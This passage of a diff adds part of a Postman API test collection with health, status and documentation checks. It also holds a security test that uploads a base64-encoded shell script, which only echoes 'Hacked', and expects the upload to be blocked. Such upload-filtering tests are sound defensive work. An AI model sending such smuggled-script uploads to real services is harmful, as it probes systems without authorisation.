+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/upload",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "upload"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"file\": \"data:application/x-sh;base64,IyEvYmluL3NoCmVjaG8gIkhhY2tlZCI=\"}"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Malicious file blocked', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([400, 403]);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "name": "13 - Utility & Information",
+          "item": [
+            {
+              "name": "Health Check",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{blue_base_url}}/health",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "health"
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Status code is 200', function () {",
+                      "    pm.response.to.have.status(200);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "API Status",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/status",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "status"
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Status code is 200', function () {",
+                      "    pm.response.to.have.status(200);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "API Documentation",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/docs",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "docs"
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
